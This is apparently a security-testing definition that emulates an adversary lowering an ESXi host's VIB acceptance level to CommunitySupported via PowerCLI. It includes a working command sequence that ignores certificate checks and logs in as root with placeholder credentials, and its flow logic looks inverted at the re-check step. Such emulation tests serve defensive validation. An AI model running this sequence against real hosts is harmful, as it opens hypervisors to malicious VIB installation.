{
  "id": "062f92c9-28b1-4391-a5f8-9d8ca6852091",
  "name": "ESXi - Change VIB acceptance level to CommunitySupported via PowerCLI",
  "description": "An adversary can change the VIB acceptance level to CommunitySupported to downgrade the acceptance criteria.This can be accomplished via PowerCLI. Afterwards an adversary may proceed to installing malicious VIBs on the host.\n[Reference](https://www.mandiant.com/resources/blog/esxi-hypervisors-detection-hardening)\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "1b5fe4e4-d5be-471a-a131-f3c307f8fbef",
      "type": "execute-command",
      "data": {
        "command": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\n(Get-EsxCli -VMHost #{vm_host} -V2).software.acceptance.set.Invoke(@{level = \"CommunitySupported\"})\nDisconnect-VIServer -Confirm:$false",
        "command_type": "powershell"
      },
      "elevation_required": true
    },
    {
      "id": "6fc19d51-acdd-4f0d-9bad-34137bbd28f3",
      "name": "Check dependency 1/1",
      "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
      "type": "execute-command",
      "data": {
        "command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": true
    },
    {
      "id": "37fafb94-a076-4771-b36f-7fa3326f08c7",
      "name": "Resolve dependency 1/1",
      "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
      "type": "execute-command",
      "data": {
        "command": "Install-Module -Name VMware.PowerCLI -Confirm:$false",
        "command_type": "powershell"
      },
      "elevation_required": true
    },
    {
      "id": "f642fa1c-20c5-498e-aa4c-fc5bad1e1bde",
      "name": "Re-check dependency 1/1",
      "description": "Check if VMWARE PowerCLI PowerShell Module is installed.\n",
      "type": "execute-command",
      "data": {
        "command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}",
        "command_type": "powershell"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "6fc19d51-acdd-4f0d-9bad-34137bbd28f3",
      "p": "on-success",
      "o": "1b5fe4e4-d5be-471a-a131-f3c307f8fbef"
    },
    {
      "s": "6fc19d51-acdd-4f0d-9bad-34137bbd28f3",
      "p": "on-failure",
      "o": "37fafb94-a076-4771-b36f-7fa3326f08c7"
    },
    {
      "s": "37fafb94-a076-4771-b36f-7fa3326f08c7",
      "p": "on-success",
      "o": "f642fa1c-20c5-498e-aa4c-fc5bad1e1bde"
    },
    {
      "s": "f642fa1c-20c5-498e-aa4c-fc5bad1e1bde",
      "p": "on-failure",
      "o": "1b5fe4e4-d5be-471a-a131-f3c307f8fbef"
    }
  ],
  "tags": [
    "T1562",
    "T1562.010"
  ],
  "input_arguments": [
    {
      "name": "vm_user",
      "type": "string",
      "description": "Specify the privilege user account on ESXi Server",
      "value": "root"
    },
    {
      "name": "vm_pass",
      "type": "string",
      "description": "Specify the privilege user password on ESXi Server",
      "value": "pass"
    },
    {
      "name": "vm_host",
      "type": "string",
      "description": "Specify the host name of the ESXi Server",
      "value": "atomic.local"
    }
  ]
}